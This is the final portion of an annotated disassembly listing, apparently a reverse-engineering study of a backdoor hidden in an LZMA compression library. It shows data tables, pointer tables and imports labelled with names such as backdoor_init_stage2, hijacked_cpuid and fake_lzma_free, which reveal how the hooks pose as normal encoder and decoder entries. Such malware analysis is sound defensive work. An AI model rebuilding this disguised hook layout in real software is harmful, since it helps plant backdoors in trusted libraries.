.rodata.crc64_clmul1:000000000000C95B                 db    0
.rodata.crc64_clmul1:000000000000C95C                 db    8
.rodata.crc64_clmul1:000000000000C95D                 db  10h
.rodata.crc64_clmul1:000000000000C95E                 db    8
.rodata.crc64_clmul1:000000000000C95F                 db    0
.rodata.crc64_clmul1:000000000000C960                 db    0
.rodata.crc64_clmul1:000000000000C961                 db    0
.rodata.crc64_clmul1:000000000000C962                 db    0
.rodata.crc64_clmul1:000000000000C963                 db    0
.rodata.crc64_clmul1:000000000000C964                 db    0
.rodata.crc64_clmul1:000000000000C965                 db    0
.rodata.crc64_clmul1:000000000000C966                 db    0
.rodata.crc64_clmul1:000000000000C967                 db    0
.rodata.crc64_clmul1:000000000000C968                 db    0
.rodata.crc64_clmul1:000000000000C969                 db    0
.rodata.crc64_clmul1:000000000000C96A                 db    0
.rodata.crc64_clmul1:000000000000C96B                 db    0
.rodata.crc64_clmul1:000000000000C96C                 db    4
.rodata.crc64_clmul1:000000000000C96D                 db    0
.rodata.crc64_clmul1:000000000000C96E                 db    8
.rodata.crc64_clmul1:000000000000C96F                 db    0
.rodata.crc64_clmul1:000000000000C970                 db    0
.rodata.crc64_clmul1:000000000000C971                 db    0
.rodata.crc64_clmul1:000000000000C972                 db    0
.rodata.crc64_clmul1:000000000000C973                 db    0
.rodata.crc64_clmul1:000000000000C974                 db    0
.rodata.crc64_clmul1:000000000000C975                 db    0
.rodata.crc64_clmul1:000000000000C976                 db    0
.rodata.crc64_clmul1:000000000000C977                 db    0
.rodata.crc64_clmul1:000000000000C978                 db    0
.rodata.crc64_clmul1:000000000000C979                 db    0
.rodata.crc64_clmul1:000000000000C97A                 db    0
.rodata.crc64_clmul1:000000000000C97B                 db    0
.rodata.crc64_clmul1:000000000000C97C                 db  10h
.rodata.crc64_clmul1:000000000000C97D                 db    2
.rodata.crc64_clmul1:000000000000C97E                 db    0
.rodata.crc64_clmul1:000000000000C97F                 db    0
.rodata.crc64_clmul1:000000000000C980                 db    0
.rodata.crc64_clmul1:000000000000C981                 db    0
.rodata.crc64_clmul1:000000000000C982                 db    0
.rodata.crc64_clmul1:000000000000C983                 db    0
.rodata.crc64_clmul1:000000000000C984                 db    0
.rodata.crc64_clmul1:000000000000C985                 db    0
.rodata.crc64_clmul1:000000000000C986                 db    0
.rodata.crc64_clmul1:000000000000C987                 db    0
.rodata.crc64_clmul1:000000000000C988                 db    0
.rodata.crc64_clmul1:000000000000C989                 db    0
.rodata.crc64_clmul1:000000000000C98A                 db    0
.rodata.crc64_clmul1:000000000000C98B                 db    0
.rodata.crc64_clmul1:000000000000C98C                 db    2
.rodata.crc64_clmul1:000000000000C98D                 db    0
.rodata.crc64_clmul1:000000000000C98E                 db  40h ; @
.rodata.crc64_clmul1:000000000000C98F                 db    0
.rodata.crc64_clmul1:000000000000C990                 db    0
.rodata.crc64_clmul1:000000000000C991                 db    0
.rodata.crc64_clmul1:000000000000C992                 db    0
.rodata.crc64_clmul1:000000000000C993                 db    0
.rodata.crc64_clmul1:000000000000C994                 db    0
.rodata.crc64_clmul1:000000000000C995                 db    0
.rodata.crc64_clmul1:000000000000C996                 db    0
.rodata.crc64_clmul1:000000000000C997                 db    0
.rodata.crc64_clmul1:000000000000C998                 db    0
.rodata.crc64_clmul1:000000000000C999                 db    0
.rodata.crc64_clmul1:000000000000C99A                 db    0
.rodata.crc64_clmul1:000000000000C99B                 db    0
.rodata.crc64_clmul1:000000000000C99C                 db    2
.rodata.crc64_clmul1:000000000000C99D                 db    8
.rodata.crc64_clmul1:000000000000C99E                 db    1
.rodata.crc64_clmul1:000000000000C99F                 db    0
.rodata.crc64_clmul1:000000000000C9A0                 db    0
.rodata.crc64_clmul1:000000000000C9A1                 db    0
.rodata.crc64_clmul1:000000000000C9A2                 db    0
.rodata.crc64_clmul1:000000000000C9A3                 db    0
.rodata.crc64_clmul1:000000000000C9A4                 db    0
.rodata.crc64_clmul1:000000000000C9A5                 db    0
.rodata.crc64_clmul1:000000000000C9A6                 db    0
.rodata.crc64_clmul1:000000000000C9A7                 db    0
.rodata.crc64_clmul1:000000000000C9A8                 db    0
.rodata.crc64_clmul1:000000000000C9A9                 db    0
.rodata.crc64_clmul1:000000000000C9AA                 db    0
.rodata.crc64_clmul1:000000000000C9AB                 db    0
.rodata.crc64_clmul1:000000000000C9AC                 db    0
.rodata.crc64_clmul1:000000000000C9AD                 db    0
.rodata.crc64_clmul1:000000000000C9AE                 db    2
.rodata.crc64_clmul1:000000000000C9AF                 db    0
.rodata.crc64_clmul1:000000000000C9B0                 db    0
.rodata.crc64_clmul1:000000000000C9B1                 db    0
.rodata.crc64_clmul1:000000000000C9B2                 db    0
.rodata.crc64_clmul1:000000000000C9B3                 db    0
.rodata.crc64_clmul1:000000000000C9B4                 db    0
.rodata.crc64_clmul1:000000000000C9B5                 db    0
.rodata.crc64_clmul1:000000000000C9B6                 db    0
.rodata.crc64_clmul1:000000000000C9B7                 db    0
.rodata.crc64_clmul1:000000000000C9B8                 db    0
.rodata.crc64_clmul1:000000000000C9B9                 db    0
.rodata.crc64_clmul1:000000000000C9BA                 db    0
.rodata.crc64_clmul1:000000000000C9BB                 db    0
.rodata.crc64_clmul1:000000000000C9BC                 db  40h ; @
.rodata.crc64_clmul1:000000000000C9BD                 db    2
.rodata.crc64_clmul1:000000000000C9BE                 db    6
.rodata.crc64_clmul1:000000000000C9BF                 db    0
.rodata.crc64_clmul1:000000000000C9C0                 db    0
.rodata.crc64_clmul1:000000000000C9C1                 db    0
.rodata.crc64_clmul1:000000000000C9C2                 db    0
.rodata.crc64_clmul1:000000000000C9C3                 db    0
.rodata.crc64_clmul1:000000000000C9C4                 db    0
.rodata.crc64_clmul1:000000000000C9C5                 db    0
.rodata.crc64_clmul1:000000000000C9C6                 db    0
.rodata.crc64_clmul1:000000000000C9C7                 db    0
.rodata.crc64_clmul1:000000000000C9C8                 db    0
.rodata.crc64_clmul1:000000000000C9C9                 db    0
.rodata.crc64_clmul1:000000000000C9CA                 db    0
.rodata.crc64_clmul1:000000000000C9CB                 db    0
.rodata.crc64_clmul1:000000000000C9CC                 db  20h
.rodata.crc64_clmul1:000000000000C9CD                 db    0
.rodata.crc64_clmul1:000000000000C9CE                 db    8
.rodata.crc64_clmul1:000000000000C9CF                 db    0
.rodata.crc64_clmul1:000000000000C9D0                 db    0
.rodata.crc64_clmul1:000000000000C9D1                 db    0
.rodata.crc64_clmul1:000000000000C9D2                 db    0
.rodata.crc64_clmul1:000000000000C9D3                 db    0
.rodata.crc64_clmul1:000000000000C9D4                 db    0
.rodata.crc64_clmul1:000000000000C9D5                 db    0
.rodata.crc64_clmul1:000000000000C9D6                 db    0
.rodata.crc64_clmul1:000000000000C9D7                 db    0
.rodata.crc64_clmul1:000000000000C9D8                 db    0
.rodata.crc64_clmul1:000000000000C9D9                 db    0
.rodata.crc64_clmul1:000000000000C9DA                 db    0
.rodata.crc64_clmul1:000000000000C9DB                 db    0
.rodata.crc64_clmul1:000000000000C9DC                 db  9Ah
.rodata.crc64_clmul1:000000000000C9DD                 db  10h
.rodata.crc64_clmul1:000000000000C9DE                 db  1Dh
.rodata.crc64_clmul1:000000000000C9DF                 db    0
.rodata.crc64_clmul1:000000000000C9E0                 db    0
.rodata.crc64_clmul1:000000000000C9E1                 db    0
.rodata.crc64_clmul1:000000000000C9E2                 db    0
.rodata.crc64_clmul1:000000000000C9E3                 db    0
.rodata.crc64_clmul1:000000000000C9E4                 db    0
.rodata.crc64_clmul1:000000000000C9E5                 db    0
.rodata.crc64_clmul1:000000000000C9E6                 db    0
.rodata.crc64_clmul1:000000000000C9E7                 db    0
.rodata.crc64_clmul1:000000000000C9E8                 db    0
.rodata.crc64_clmul1:000000000000C9E9                 db    0
.rodata.crc64_clmul1:000000000000C9EA                 db    0
.rodata.crc64_clmul1:000000000000C9EB                 db    0
.rodata.crc64_clmul1:000000000000C9EC                 db    2
.rodata.crc64_clmul1:000000000000C9ED                 db  20h
.rodata.crc64_clmul1:000000000000C9EE                 db    0
.rodata.crc64_clmul1:000000000000C9EF                 db    0
.rodata.crc64_clmul1:000000000000C9F0                 db    0
.rodata.crc64_clmul1:000000000000C9F1                 db    0
.rodata.crc64_clmul1:000000000000C9F2                 db    0
.rodata.crc64_clmul1:000000000000C9F3                 db    0
.rodata.crc64_clmul1:000000000000C9F4                 db    0
.rodata.crc64_clmul1:000000000000C9F5                 db    0
.rodata.crc64_clmul1:000000000000C9F6                 db    0
.rodata.crc64_clmul1:000000000000C9F7                 db    0
.rodata.crc64_clmul1:000000000000C9F8                 db    0
.rodata.crc64_clmul1:000000000000C9F9                 db    0
.rodata.crc64_clmul1:000000000000C9FA                 db    0
.rodata.crc64_clmul1:000000000000C9FB                 db    0
.rodata.crc64_clmul1:000000000000C9FC                 db    0
.rodata.crc64_clmul1:000000000000C9FD                 db    0
.rodata.crc64_clmul1:000000000000C9FE                 db  0Ch
.rodata.crc64_clmul1:000000000000C9FF                 db    0
.rodata.crc64_clmul1:000000000000CA00                 db    0
.rodata.crc64_clmul1:000000000000CA01                 db    0
.rodata.crc64_clmul1:000000000000CA02                 db    0
.rodata.crc64_clmul1:000000000000CA03                 db    0
.rodata.crc64_clmul1:000000000000CA04                 db    0
.rodata.crc64_clmul1:000000000000CA05                 db    0
.rodata.crc64_clmul1:000000000000CA06                 db    0
.rodata.crc64_clmul1:000000000000CA07                 db    0
.rodata.crc64_clmul1:000000000000CA08                 db    0
.rodata.crc64_clmul1:000000000000CA09                 db    0
.rodata.crc64_clmul1:000000000000CA0A                 db    0
.rodata.crc64_clmul1:000000000000CA0B                 db    0
.rodata.crc64_clmul1:000000000000CA0C                 db    2
.rodata.crc64_clmul1:000000000000CA0D                 db    0
.rodata.crc64_clmul1:000000000000CA0E                 db  2Ch ; ,
.rodata.crc64_clmul1:000000000000CA0F                 db    0
.rodata.crc64_clmul1:000000000000CA10                 db    0
.rodata.crc64_clmul1:000000000000CA11                 db    0
.rodata.crc64_clmul1:000000000000CA12                 db    0
.rodata.crc64_clmul1:000000000000CA13                 db    0
.rodata.crc64_clmul1:000000000000CA14                 db    0
.rodata.crc64_clmul1:000000000000CA15                 db    0
.rodata.crc64_clmul1:000000000000CA16                 db    0
.rodata.crc64_clmul1:000000000000CA17                 db    0
.rodata.crc64_clmul1:000000000000CA18                 db    0
.rodata.crc64_clmul1:000000000000CA19                 db    0
.rodata.crc64_clmul1:000000000000CA1A                 db    0
.rodata.crc64_clmul1:000000000000CA1B                 db    0
.rodata.crc64_clmul1:000000000000CA1C                 db  80h
.rodata.crc64_clmul1:000000000000CA1D                 db    0
.rodata.crc64_clmul1:000000000000CA1E                 db  20h
.rodata.crc64_clmul1:000000000000CA1F                 db    0
.rodata.crc64_clmul1:000000000000CA20                 db    0
.rodata.crc64_clmul1:000000000000CA21                 db    0
.rodata.crc64_clmul1:000000000000CA22                 db    0
.rodata.crc64_clmul1:000000000000CA23                 db    0
.rodata.crc64_clmul1:000000000000CA24                 db    0
.rodata.crc64_clmul1:000000000000CA25                 db    0
.rodata.crc64_clmul1:000000000000CA26                 db    0
.rodata.crc64_clmul1:000000000000CA27                 db    0
.rodata.crc64_clmul1:000000000000CA28                 db    0
.rodata.crc64_clmul1:000000000000CA29                 db    0
.rodata.crc64_clmul1:000000000000CA2A                 db    0
.rodata.crc64_clmul1:000000000000CA2B                 db    0
.rodata.crc64_clmul1:000000000000CA2C                 db    0
.rodata.crc64_clmul1:000000000000CA2D                 db  10h
.rodata.crc64_clmul1:000000000000CA2E                 db    4
.rodata.crc64_clmul1:000000000000CA2F                 db    0
.rodata.crc64_clmul1:000000000000CA30                 db    0
.rodata.crc64_clmul1:000000000000CA31                 db    0
.rodata.crc64_clmul1:000000000000CA32                 db    0
.rodata.crc64_clmul1:000000000000CA33                 db    0
.rodata.crc64_clmul1:000000000000CA34                 db    0
.rodata.crc64_clmul1:000000000000CA35                 db    0
.rodata.crc64_clmul1:000000000000CA36                 db    0
.rodata.crc64_clmul1:000000000000CA37                 db    0
.rodata.crc64_clmul1:000000000000CA38                 db    1
.rodata.crc64_clmul1:000000000000CA39                 db    0
.rodata.crc64_clmul1:000000000000CA3A                 db    0
.rodata.crc64_clmul1:000000000000CA3B                 db    0
.rodata.crc64_clmul1:000000000000CA3C                 db    0
.rodata.crc64_clmul1:000000000000CA3D                 db    0
.rodata.crc64_clmul1:000000000000CA3E                 db    0
.rodata.crc64_clmul1:000000000000CA3F                 db    0
.rodata.crc64_clmul1:000000000000CA40                 db    0
.rodata.crc64_clmul1:000000000000CA41                 db    0
.rodata.crc64_clmul1:000000000000CA42                 db    0
.rodata.crc64_clmul1:000000000000CA43                 db    0
.rodata.crc64_clmul1:000000000000CA44                 db    0
.rodata.crc64_clmul1:000000000000CA45                 db    0
.rodata.crc64_clmul1:000000000000CA46                 db    4
.rodata.crc64_clmul1:000000000000CA47                 db    0
.rodata.crc64_clmul1:000000000000CA48                 db    0
.rodata.crc64_clmul1:000000000000CA49                 db    0
.rodata.crc64_clmul1:000000000000CA4A                 db    0
.rodata.crc64_clmul1:000000000000CA4B                 db    0
.rodata.crc64_clmul1:000000000000CA4C                 db    0
.rodata.crc64_clmul1:000000000000CA4D                 db    0
.rodata.crc64_clmul1:000000000000CA4E                 db    4
.rodata.crc64_clmul1:000000000000CA4F                 db    0
.rodata.crc64_clmul1:000000000000CA50                 db    0
.rodata.crc64_clmul1:000000000000CA51                 db    0
.rodata.crc64_clmul1:000000000000CA52                 db    0
.rodata.crc64_clmul1:000000000000CA53                 db    0
.rodata.crc64_clmul1:000000000000CA54                 db    0
.rodata.crc64_clmul1:000000000000CA55                 db    0
.rodata.crc64_clmul1:000000000000CA56                 db    0
.rodata.crc64_clmul1:000000000000CA57                 db    0
.rodata.crc64_clmul1:000000000000CA58                 db    0
.rodata.crc64_clmul1:000000000000CA59                 db    0
.rodata.crc64_clmul1:000000000000CA5A                 db    0
.rodata.crc64_clmul1:000000000000CA5B                 db    0
.rodata.crc64_clmul1:000000000000CA5C                 db    2
.rodata.crc64_clmul1:000000000000CA5D                 db    0
.rodata.crc64_clmul1:000000000000CA5E                 db    6
.rodata.crc64_clmul1:000000000000CA5F                 db    0
.rodata.crc64_clmul1:000000000000CA60                 db    0
.rodata.crc64_clmul1:000000000000CA61                 db    0
.rodata.crc64_clmul1:000000000000CA62                 db    0
.rodata.crc64_clmul1:000000000000CA63                 db    0
.rodata.crc64_clmul1:000000000000CA64                 db    0
.rodata.crc64_clmul1:000000000000CA65                 db  20h
.rodata.crc64_clmul1:000000000000CA66                 db    0
.rodata.crc64_clmul1:000000000000CA67                 db    0
.rodata.crc64_clmul1:000000000000CA68                 db    0
.rodata.crc64_clmul1:000000000000CA69                 db    0
.rodata.crc64_clmul1:000000000000CA6A                 db    0
.rodata.crc64_clmul1:000000000000CA6B                 db    0
.rodata.crc64_clmul1:000000000000CA6C                 db    0
.rodata.crc64_clmul1:000000000000CA6D                 db    0
.rodata.crc64_clmul1:000000000000CA6E                 db    1
.rodata.crc64_clmul1:000000000000CA6F                 db    0
.rodata.crc64_clmul1:000000000000CA70                 db    0
.rodata.crc64_clmul1:000000000000CA71                 db    0
.rodata.crc64_clmul1:000000000000CA72                 db    0
.rodata.crc64_clmul1:000000000000CA73                 db    0
.rodata.crc64_clmul1:000000000000CA74                 db    0
.rodata.crc64_clmul1:000000000000CA75                 db    0
.rodata.crc64_clmul1:000000000000CA76                 db    0
.rodata.crc64_clmul1:000000000000CA77                 db    0
.rodata.crc64_clmul1:000000000000CA78                 db    0
.rodata.crc64_clmul1:000000000000CA79                 db    0
.rodata.crc64_clmul1:000000000000CA7A                 db    0
.rodata.crc64_clmul1:000000000000CA7B                 db    0
.rodata.crc64_clmul1:000000000000CA7C                 db  20h
.rodata.crc64_clmul1:000000000000CA7D                 db    1
.rodata.crc64_clmul1:000000000000CA7E                 db  18h
.rodata.crc64_clmul1:000000000000CA7F                 db    2
.rodata.crc64_clmul1:000000000000CA80                 db    0
.rodata.crc64_clmul1:000000000000CA81                 db    0
.rodata.crc64_clmul1:000000000000CA82                 db    0
.rodata.crc64_clmul1:000000000000CA83                 db    0
.rodata.crc64_clmul1:000000000000CA84                 db    0
.rodata.crc64_clmul1:000000000000CA85                 db    0
.rodata.crc64_clmul1:000000000000CA86                 db    0
.rodata.crc64_clmul1:000000000000CA87                 db    0
.rodata.crc64_clmul1:000000000000CA88                 db    0
.rodata.crc64_clmul1:000000000000CA89                 db    0
.rodata.crc64_clmul1:000000000000CA8A                 db    0
.rodata.crc64_clmul1:000000000000CA8B                 db    0
.rodata.crc64_clmul1:000000000000CA8C                 db    0
.rodata.crc64_clmul1:000000000000CA8D                 db  40h ; @
.rodata.crc64_clmul1:000000000000CA8E                 db    8
.rodata.crc64_clmul1:000000000000CA8F                 db    0
.rodata.crc64_clmul1:000000000000CA90                 dq 0
.rodata.crc64_clmul1:000000000000CA98                 dq 40000000000h
.rodata.crc64_clmul1:000000000000CAA0                 dq 802100000000h
.rodata.crc64_clmul1:000000000000CAA8                 db 0BEh
.rodata.crc64_clmul1:000000000000CAA9                 db  18h
.rodata.crc64_clmul1:000000000000CAAA                 db 0BCh
.rodata.crc64_clmul1:000000000000CAAB                 db  80h
.rodata.crc64_clmul1:000000000000CAAC                 db  92h
.rodata.crc64_clmul1:000000000000CAAD                 db  30h ; 0
.rodata.crc64_clmul1:000000000000CAAE                 db 0ADh
.rodata.crc64_clmul1:000000000000CAAF                 db  83h
.rodata.crc64_clmul1:000000000000CAAF _rodata_crc64_clmul1 ends
.rodata.crc64_clmul1:000000000000CAAF
.rodata.lzma12_mf_mao.0:000000000000CAB0 ; ===========================================================================
.rodata.lzma12_mf_mao.0:000000000000CAB0
.rodata.lzma12_mf_mao.0:000000000000CAB0 ; Segment type: Pure data
.rodata.lzma12_mf_mao.0:000000000000CAB0 ; Segment permissions: Read
.rodata.lzma12_mf_mao.0:000000000000CAB0 _rodata_lzma12_mf_mao_0 segment byte public 'CONST' use64
.rodata.lzma12_mf_mao.0:000000000000CAB0                 assume cs:_rodata_lzma12_mf_mao_0
.rodata.lzma12_mf_mao.0:000000000000CAB0                 ;org 0CAB0h
.rodata.lzma12_mf_mao.0:000000000000CAB0                 public ro_gots
.rodata.lzma12_mf_mao.0:000000000000CAB0 ; struc_gots ro_gots
.rodata.lzma12_mf_mao.0:000000000000CAB0 ro_gots         dq offset addr_hinter - offset _GLOBAL_OFFSET_TABLE_
.rodata.lzma12_mf_mao.0:000000000000CAB0                                         ; DATA XREF: set_rkctx_cpuid+4↑o
.rodata.lzma12_mf_mao.0:000000000000CAB0                                         ; set_rkctx_self+4↑o ...
.rodata.lzma12_mf_mao.0:000000000000CAB8                 dq offset _cpuid_ptr - offset _GLOBAL_OFFSET_TABLE_
.rodata.lzma12_mf_mao.0:000000000000CAC0                 dq offset backdoor_init_stage2 - offset _GLOBAL_OFFSET_TABLE_
.rodata.lzma12_mf_mao.0:000000000000CAC0 _rodata_lzma12_mf_mao_0 ends
.rodata.lzma12_mf_mao.0:000000000000CAC0
.rodata.rc_encode:000000000000CAC8 ; ===========================================================================
.rodata.rc_encode:000000000000CAC8
.rodata.rc_encode:000000000000CAC8 ; Segment type: Pure data
.rodata.rc_encode:000000000000CAC8 ; Segment permissions: Read
.rodata.rc_encode:000000000000CAC8 _rodata_rc_encode segment byte public 'CONST' use64
.rodata.rc_encode:000000000000CAC8                 assume cs:_rodata_rc_encode
.rodata.rc_encode:000000000000CAC8                 ;org 0CAC8h
.rodata.rc_encode:000000000000CAC8                 public rodata_ptr_offset
.rodata.rc_encode:000000000000CAC8 rodata_ptr_offset dq 0                  ; DATA XREF: get_rodata_ptr_offset+4↑o
.rodata.rc_encode:000000000000CAC8                                         ; get_ehdr_address+13↑o
.rodata.rc_encode:000000000000CAD0 Lx86_coder_off  dq offset _Lx86_coder_destroy - offset _GLOBAL_OFFSET_TABLE_
.rodata.rc_encode:000000000000CAD0 _rodata_rc_encode ends
.rodata.rc_encode:000000000000CAD0
.data:000000000000CAD8 ; ===========================================================================
.data:000000000000CAD8
.data:000000000000CAD8 ; Segment type: Zero-length
.data:000000000000CAD8 ; Segment permissions: Read/Write
.data:000000000000CAD8 _data           segment byte public 'DATA' use64
.data:000000000000CAD8 _data           ends
.data:000000000000CAD8
.data.rel.ro.filter_optmap.0:000000000000CAE0 ; ===========================================================================
.data.rel.ro.filter_optmap.0:000000000000CAE0
.data.rel.ro.filter_optmap.0:000000000000CAE0 ; Segment type: Pure data
.data.rel.ro.filter_optmap.0:000000000000CAE0 ; Segment permissions: Read/Write
.data.rel.ro.filter_optmap.0:000000000000CAE0 _data_rel_ro_filter_optmap_0 segment qword public 'DATA' use64
.data.rel.ro.filter_optmap.0:000000000000CAE0                 assume cs:_data_rel_ro_filter_optmap_0
.data.rel.ro.filter_optmap.0:000000000000CAE0                 ;org 0CAE0h
.data.rel.ro.filter_optmap.0:000000000000CAE0 _Lfilter_optmap_0 dq offset _Lencoder_1-2A0h
.data.rel.ro.filter_optmap.0:000000000000CAE0                                         ; DATA XREF: get__Lencoder_1_addr+14↑r
.data.rel.ro.filter_optmap.0:000000000000CAE0 _data_rel_ro_filter_optmap_0 ends
.data.rel.ro.filter_optmap.0:000000000000CAE0
.data.rel.ro.lookup_filter.part.0:000000000000CAE8 ; ===========================================================================
.data.rel.ro.lookup_filter.part.0:000000000000CAE8
.data.rel.ro.lookup_filter.part.0:000000000000CAE8 ; Segment type: Pure data
.data.rel.ro.lookup_filter.part.0:000000000000CAE8 ; Segment permissions: Read/Write
.data.rel.ro.lookup_filter.part.0:000000000000CAE8 _data_rel_ro_lookup_filter_part_0 segment qword public 'DATA' use64
.data.rel.ro.lookup_filter.part.0:000000000000CAE8                 assume cs:_data_rel_ro_lookup_filter_part_0
.data.rel.ro.lookup_filter.part.0:000000000000CAE8                 ;org 0CAE8h
.data.rel.ro.lookup_filter.part.0:000000000000CAE8 _Llookup_filter_part_0 dq offset _Ldecoder_1-180h
.data.rel.ro.lookup_filter.part.0:000000000000CAE8                                         ; DATA XREF: get_lzma_allocator_addr+14↑r
.data.rel.ro.lookup_filter.part.0:000000000000CAE8 _data_rel_ro_lookup_filter_part_0 ends
.data.rel.ro.lookup_filter.part.0:000000000000CAE8
.data.rel.ro.decoders0:000000000000CAF0 ; ===========================================================================
.data.rel.ro.decoders0:000000000000CAF0
.data.rel.ro.decoders0:000000000000CAF0 ; Segment type: Pure data
.data.rel.ro.decoders0:000000000000CAF0 ; Segment permissions: Read/Write
.data.rel.ro.decoders0:000000000000CAF0 _data_rel_ro_decoders0 segment qword public 'DATA' use64
.data.rel.ro.decoders0:000000000000CAF0                 assume cs:_data_rel_ro_decoders0
.data.rel.ro.decoders0:000000000000CAF0                 ;org 0CAF0h
.data.rel.ro.decoders0:000000000000CAF0 _Ldecoder_1     dq 22h                  ; DATA XREF: .data.rel.ro.lookup_filter.part.0:_Llookup_filter_part_0↑o
.data.rel.ro.decoders0:000000000000CAF8 ; lzma_allocator data_lzma_allocator
.data.rel.ro.decoders0:000000000000CAF8 data_lzma_allocator dq offset _Linit_pric_table_part_1; alloc
.data.rel.ro.decoders0:000000000000CAF8                 dq offset fake_lzma_free; free
.data.rel.ro.decoders0:000000000000CAF8                 dq 10h                  ; elf_info
.data.rel.ro.decoders0:000000000000CAF8 _data_rel_ro_decoders0 ends
.data.rel.ro.decoders0:000000000000CAF8
.data.rel.ro.encoders0:000000000000CB10 ; ===========================================================================
.data.rel.ro.encoders0:000000000000CB10
.data.rel.ro.encoders0:000000000000CB10 ; Segment type: Pure data
.data.rel.ro.encoders0:000000000000CB10 ; Segment permissions: Read/Write
.data.rel.ro.encoders0:000000000000CB10 _data_rel_ro_encoders0 segment qword public 'DATA' use64
.data.rel.ro.encoders0:000000000000CB10                 assume cs:_data_rel_ro_encoders0
.data.rel.ro.encoders0:000000000000CB10                 ;org 0CB10h
.data.rel.ro.encoders0:000000000000CB10 _Lencoder_1     dq 22h                  ; DATA XREF: .data.rel.ro.filter_optmap.0:_Lfilter_optmap_0↑o
.data.rel.ro.encoders0:000000000000CB18                 dq offset backdoor_vtbl_init
.data.rel.ro.encoders0:000000000000CB20                 dq 0
.data.rel.ro.encoders0:000000000000CB28                 dq 0
.data.rel.ro.encoders0:000000000000CB30                 dq offset import_lookup_ex
.data.rel.ro.encoders0:000000000000CB38                 align 20h
.data.rel.ro.encoders0:000000000000CB40                 dq offset parse_elf
.data.rel.ro.encoders0:000000000000CB40 _data_rel_ro_encoders0 ends
.data.rel.ro.encoders0:000000000000CB40
.bss:000000000000CB48 ; ===========================================================================
.bss:000000000000CB48
.bss:000000000000CB48 ; Segment type: Zero-length
.bss:000000000000CB48 ; Segment permissions: Read/Write
.bss:000000000000CB48 _bss            segment byte public 'BSS' use64
.bss:000000000000CB48 _bss            ends
.bss:000000000000CB48
.bss.filter_optionz:000000000000CB50 ; ===========================================================================
.bss.filter_optionz:000000000000CB50
.bss.filter_optionz:000000000000CB50 ; Segment type: Uninitialized
.bss.filter_optionz:000000000000CB50 ; Segment permissions: Read/Write
.bss.filter_optionz:000000000000CB50 _bss_filter_optionz segment qword public 'BSS' use64
.bss.filter_optionz:000000000000CB50                 assume cs:_bss_filter_optionz
.bss.filter_optionz:000000000000CB50                 ;org 0CB50h
.bss.filter_optionz:000000000000CB50                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.bss.filter_optionz:000000000000CB50 _Lfilter_options_0 dq ?                 ; DATA XREF: backdoor_vtbl_init+E↑o
.bss.filter_optionz:000000000000CB50                                         ; func_name_match+C↑r
.bss.filter_optionz:000000000000CB50 _bss_filter_optionz ends
.bss.filter_optionz:000000000000CB50
.bss.lzma12_codez:000000000000CB58 ; ===========================================================================
.bss.lzma12_codez:000000000000CB58
.bss.lzma12_codez:000000000000CB58 ; Segment type: Uninitialized
.bss.lzma12_codez:000000000000CB58 ; Segment permissions: Read/Write
.bss.lzma12_codez:000000000000CB58 _bss_lzma12_codez segment qword public 'BSS' use64
.bss.lzma12_codez:000000000000CB58                 assume cs:_bss_lzma12_codez
.bss.lzma12_codez:000000000000CB58                 ;org 0CB58h
.bss.lzma12_codez:000000000000CB58                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.bss.lzma12_codez:000000000000CB58                 public global_ctx
.bss.lzma12_codez:000000000000CB58 ; struct_ctx *global_ctx
.bss.lzma12_codez:000000000000CB58 global_ctx      dq ?                    ; DATA XREF: _Llzma_delta_props_decode_part_0+23↑o
.bss.lzma12_codez:000000000000CB58                                         ; func_name_match+2E↑o ...
.bss.lzma12_codez:000000000000CB58 _bss_lzma12_codez ends
.bss.lzma12_codez:000000000000CB58
.bss.__intr2:000000000000CB60 ; ===========================================================================
.bss.__intr2:000000000000CB60
.bss.__intr2:000000000000CB60 ; Segment type: Uninitialized
.bss.__intr2:000000000000CB60 ; Segment permissions: Read/Write
.bss.__intr2:000000000000CB60 _bss___intr2    segment qword public 'BSS' use64
.bss.__intr2:000000000000CB60                 assume cs:_bss___intr2
.bss.__intr2:000000000000CB60                 ;org 0CB60h
.bss.__intr2:000000000000CB60                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.bss.__intr2:000000000000CB60 global_counter  dd ?                    ; DATA XREF: hijacked_cpuid+12↑r
.bss.__intr2:000000000000CB60                                         ; hijacked_cpuid+5B↑w
.bss.__intr2:000000000000CB60 _bss___intr2    ends
.bss.__intr2:000000000000CB60
extern:000000000000CB68 ; ===========================================================================
extern:000000000000CB68
extern:000000000000CB68 ; Segment type: Externs
extern:000000000000CB68 ; extern
extern:000000000000CB68 ; __int64 __fastcall lzma_check_init(_QWORD, _QWORD)
extern:000000000000CB68                 extrn lzma_check_init:near
extern:000000000000CB68                                         ; CODE XREF: backdoor_init_stage2+5C↑p
extern:000000000000CB70 ; __int64 __fastcall _tls_get_addr(_QWORD)
extern:000000000000CB70                 extrn __tls_get_addr:near
extern:000000000000CB70                                         ; CODE XREF: j_tls_get_addr+17↑p
extern:000000000000CB78 ; __int64 __fastcall lzma_free(_QWORD, _QWORD)
extern:000000000000CB78                 extrn lzma_free:near    ; CODE XREF: sub_2540+91↑p
extern:000000000000CB78                                         ; resolve_imports+14D↑p ...
extern:000000000000CB80 ; __int64 __fastcall lzma_alloc(_QWORD, _QWORD)
extern:000000000000CB80                 extrn lzma_alloc:near   ; CODE XREF: sub_2540+5D↑p
extern:000000000000CB80                                         ; resolve_imports+77↑p ...
extern:000000000000CB80
.got:000000000000CB88 ; ===========================================================================
.got:000000000000CB88
.got:000000000000CB88 ; Segment type: Pure data
.got:000000000000CB88 ; Segment permissions: Read
.got:000000000000CB88 _got            segment qword public 'CONST' use64
.got:000000000000CB88                 assume cs:_got
.got:000000000000CB88                 ;org 0CB88h
.got:000000000000CB88 _GLOBAL_OFFSET_TABLE_ dq 0              ; DATA XREF: .rodata.lzma12_mf_mao.0:ro_gots↑o
.got:000000000000CB88                                         ; .rodata.lzma12_mf_mao.0:000000000000CAB8↑o ...
.got:000000000000CB90 _cpuid_ptr      dq offset _cpuid        ; DATA XREF: backdoor_init+53↑r
.got:000000000000CB90                                         ; .rodata.lzma12_mf_mao.0:000000000000CAB8↑o
.got:000000000000CB90 _got            ends
.got:000000000000CB90
.got:000000000000CB90
.got:000000000000CB90                 end
